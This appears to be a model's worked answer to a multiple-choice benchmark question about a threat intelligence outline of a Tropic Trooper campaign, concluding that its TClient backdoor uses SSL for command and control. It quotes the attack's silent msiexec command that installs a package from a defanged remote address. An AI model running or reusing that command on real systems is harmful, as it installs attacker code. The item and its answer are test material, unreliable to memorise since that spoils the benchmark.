I have a CTI outline that describes a cyber attack attributed to Tropic Trooper, also known as KeyBoy. The outline details various stages of the attack, including initial access, execution, persistence, and defense evasion. There's also some additional context about the threat actor's tactics and methods. The question is about whether, after using DLL hijacking for defense evasion, TClient will use SSL to connect to the C&C server during the command and control phase.

First, I need to understand the sequence of events as described in the CTI outline. Let's break it down step by step.

**Initial Access:**

- Tropic Trooper uses exploits for CVE-2017-11882 or CVE-2018-0802, which are vulnerabilities in Microsoft Office's Equation Editor.

- They download an installer package (.msi) and install it on the system using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Execution:**

- The system configuration file (in.sys) drops a backdoor installer (UserInstall.exe) and then deletes itself.

- UserInstall.exe drops a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (wab32res.dll), and an encrypted configuration file.

- UserInstall.exe uses BITSadmin to create a job and launch sidebar.exe.

- The malicious loader uses DLL hijacking on sidebar.exe to launch dllhost.exe.

- The loader injects a DLL backdoor into dllhost.exe.

- Additionally, malicious documents that don't need to download anything from the internet are used, as the backdoor's dropper is already embedded in the document.

**Persistence:**

- The backdoor loads and decrypts the encrypted configuration file.

- It uses SSL protocol to connect to command-and-control (C&C) servers.

**Defense Evasion:**

- Tropic Trooper uses DLL hijacking to evade antivirus detection.

- The malicious wab32res.dll is loaded by a benign file, sidebar.exe.

- The installer drops three files into the Apple/Update directory and creates one hidden directory (UFile) into `C:\ProgramData\Apple\Update\`, likely as a ruse.

**Others:**

- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.

- These documents use job vacancies in socio-politically sensitive organizations to entice recipients.

- The MSI file contains two PDB strings: one for the MSI file and another for the backdoor installer (TROJ_TCDROP.ZTFB).

- Another PDB string is found: `D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb`.

- During installation, the MSI drops three files and creates a hidden directory (UFile) in `C:\ProgramData\Apple\Update\`.

- It uses sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking to evade AV detection.

- Reverse analysis of TClient allows decryption of C&C information.

- TClient uses custom SSL libraries to connect to the C&C server.

- A recently registered SSL certificate on the C&C server is set to expire in a year, suggesting the threat actor's strategy to minimize traces.

Now, the question is: After Tropic Trooper removed its traces by using DLL hijacking to load the malicious wab32res.dll through a benign file during the Defense Evasion phase, is it likely that TClient will use SSL to connect to Tropic Trooper's C&C server during the Command and Control phase?

The answer choices are:

A: Yes

B: No

To answer this, I need to look for information in the CTI outline that indicates whether TClient uses SSL for C&C communication.

Looking back at the Persistence section:

- "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers."

This directly states that SSL is used for C&C communication.

Additionally, in the Others section:

- "Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server."

This further confirms that TClient uses SSL for communicating with the C&C server.

Given this information, it is clear that TClient uses SSL for C&C communication.

Therefore, the answer should be:

Final Answer: A
